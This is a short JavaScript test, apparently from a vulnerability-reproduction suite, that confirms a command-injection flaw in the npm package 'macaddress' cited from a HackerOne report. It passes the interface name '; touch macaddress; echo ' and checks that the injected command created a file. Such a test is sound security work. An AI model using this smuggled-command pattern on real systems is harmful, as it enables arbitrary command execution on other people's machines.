//https://hackerone.com/reports/319467
test("Command Injection in macaddress", () => {
  const killing = require("killing");
  const fs = require("fs");
  const path = "./macaddress";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let iface = "; touch macaddress; echo ";
  require("macaddress").one(iface, function (err, mac) {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
